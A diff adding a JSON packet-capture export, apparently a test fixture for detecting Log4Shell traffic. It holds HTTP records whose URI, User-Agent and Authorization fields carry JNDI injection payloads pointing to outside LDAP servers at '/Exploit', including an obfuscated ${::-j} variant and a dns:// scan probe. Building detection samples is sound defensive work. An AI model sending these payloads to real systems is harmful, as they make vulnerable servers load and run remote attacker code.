@@ -1,0 +1,234 @@
+[
+  {
+    "_index": "packets-1969-12-31",
+    "_score": null,
+    "_source": {
+      "layers": {
+        "frame.number": [
+          "1"
+        ],
+        "frame.time": [
+          "1969-12-31T19:01:40.000000000-0500"
+        ],
+        "ip.src": [
+          "10.0.0.5"
+        ],
+        "ip.dst": [
+          "45.83.65.61"
+        ],
+        "_ws.col.protocol": [
+          "HTTP"
+        ],
+        "http.request.method": [
+          "GET"
+        ],
+        "http.request.uri": [
+          "/${jndi:ldap://45.83.65.61:1389/Exploit}"
+        ],
+        "http.user_agent": [
+          "Mozilla/5.0"
+        ],
+        "tcp.dstport": [
+          "80"
+        ],
+        "text": [
+          "Timestamps",
+          "GET /${jndi:ldap://45.83.65.61:1389/Exploit} HTTP/1.1\\r\\n",
+          "\\r\\n"
+        ]
+      }
+    }
+  },
+  {
+    "_index": "packets-1969-12-31",
+    "_score": null,
+    "_source": {
+      "layers": {
+        "frame.number": [
+          "2"
+        ],
+        "frame.time": [
+          "1969-12-31T19:01:41.000000000-0500"
+        ],
+        "ip.src": [
+          "10.0.0.5"
+        ],
+        "ip.dst": [
+          "198.71.247.91"
+        ],
+        "_ws.col.protocol": [
+          "HTTP"
+        ],
+        "http.request.method": [
+          "GET"
+        ],
+        "http.request.uri": [
+          "/"
+        ],
+        "http.user_agent": [
+          "${jndi:ldap://121.140.99.236:1389/Exploit}"
+        ],
+        "tcp.dstport": [
+          "80"
+        ],
+        "text": [
+          "Timestamps",
+          "GET / HTTP/1.1\\r\\n",
+          "\\r\\n"
+        ]
+      }
+    }
+  },
+  {
+    "_index": "packets-1969-12-31",
+    "_score": null,
+    "_source": {
+      "layers": {
+        "frame.number": [
+          "3"
+        ],
+        "frame.time": [
+          "1969-12-31T19:01:42.000000000-0500"
+        ],
+        "ip.src": [
+          "175.6.210.66"
+        ],
+        "ip.dst": [
+          "10.0.0.5"
+        ],
+        "_ws.col.protocol": [
+          "HTTP"
+        ],
+        "http.request.method": [
+          "GET"
+        ],
+        "http.request.uri": [
+          "/"
+        ],
+        "http.user_agent": [
+          "curl/7.58.0"
+        ],
+        "http.authorization": [
+          "Basic ${jndi:ldap://121.140.99.236:1389/Exploit}"
+        ],
+        "tcp.dstport": [
+          "80"
+        ],
+        "text": [
+          "Timestamps",
+          "GET / HTTP/1.1\\r\\n",
+          "\\r\\n"
+        ]
+      }
+    }
+  },
+  {
+    "_index": "packets-1969-12-31",
+    "_score": null,
+    "_source": {
+      "layers": {
+        "frame.number": [
+          "4"
+        ],
+        "frame.time": [
+          "1969-12-31T19:01:43.000000000-0500"
+        ],
+        "ip.src": [
+          "10.0.0.6"
+        ],
+        "ip.dst": [
+          "195.54.160.149"
+        ],
+        "_ws.col.protocol": [
+          "HTTP"
+        ],
+        "http.request.method": [
+          "GET"
+        ],
+        "http.request.uri": [
+          "/?x=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/a}"
+        ],
+        "http.user_agent": [
+          "curl/7.68.0"
+        ],
+        "tcp.dstport": [
+          "80"
+        ],
+        "text": [
+          "Timestamps",
+          "GET /?x=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/a} HTTP/1.1\\r\\n",
+          "\\r\\n"
+        ]
+      }
+    }
+  },
+  {
+    "_index": "packets-1969-12-31",
+    "_score": null,
+    "_source": {
+      "layers": {
+        "frame.number": [
+          "5"
+        ],
+        "frame.time": [
+          "1969-12-31T19:01:44.000000000-0500"
+        ],
+        "ip.src": [
+          "195.54.160.149"
+        ],
+        "ip.dst": [
+          "10.0.0.5"
+        ],
+        "_ws.col.protocol": [
+          "TCP"
+        ],
+        "tcp.dstport": [
+          "80"
+        ],
+        "text": [
+          "Timestamps"
+        ]
+      }
+    }
+  },
+  {
+    "_index": "packets-1969-12-31",
+    "_score": null,
+    "_source": {
+      "layers": {
+        "frame.number": [
+          "8"
+        ],
+        "frame.time": [
+          "1969-12-31T19:01:47.000000000-0500"
+        ],
+        "ip.src": [
+          "10.0.0.6"
+        ],
+        "ip.dst": [
+          "195.54.160.149"
+        ],
+        "_ws.col.protocol": [
+          "HTTP"
+        ],
+        "http.request.method": [
+          "GET"
+        ],
+        "http.request.uri": [
+          "/"
+        ],
+        "http.user_agent": [
+          "${jndi:dns://195.54.160.149:1389/securityscan-nlmvuu62bvi6yfl3}"
+        ],
+        "tcp.dstport": [
+          "80"
+        ],
+        "text": [
+          "Timestamps",
+          "GET / HTTP/1.1\\r\\n",
+          "\\r\\n"
+        ]
+      }
+    }
+  }
+]
